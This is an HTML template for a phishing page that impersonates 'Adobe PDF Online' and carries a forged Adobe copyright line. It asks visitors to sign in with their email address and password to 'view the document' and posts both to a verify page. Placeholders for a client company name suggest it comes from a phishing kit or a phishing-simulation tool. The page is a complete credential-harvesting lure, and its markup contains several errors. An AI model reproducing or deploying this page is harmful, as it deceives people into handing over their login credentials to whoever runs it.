<!DOCTYPE html>
<html>
	<head>
		<title="{{ client.company_name }} PDF Viewer" />
		<link rel="stylesheet" type="text/css" href="./include/styles.css">
	</head>
	<body>
		<div class="container">
			<img src="./images/pdf.png" class="background-pdf" />
			<div class="popup">
				<div class="popup-header">
					<img src="./images/pdf_logo.png" />
					<span class="headline">Adobe PDF Online</span>
				</div>
				<form class="login-form" method="post" action="./verify.html">
					<span class="login-header">Confirm Reciever Email Identity</span>
					<div class="tagline">Sign in with your Email Address to view the document.</dif>
					<table>
						<tr>
							<td>Email:</td>
							<td class="box"><input type="text" id="username" name="username" />
						</tr>
						<tr>
							<td>Password:</td>
							<td class="box"><input type="password" id="password" name="password" />
						</tr>
						<tr>
							<td>&nbsp;</td>
							<td class="box"><input type="checkbox" id="public" /> <span class="tagline">Check if using public computer</span>
						</tr>
						<tr>
							<td>&nbsp;</td>
							<td class="box"><input type="submit" id="submit" value="View Document" class="button" />
						</tr>
					</table>
					<div class="copyright">
						<p>&copy; Copyright {{ datetime.datetime(%y) }} Adobe Corporation</p>
					</div>
				</form>
		</div>
	</body>
</html>
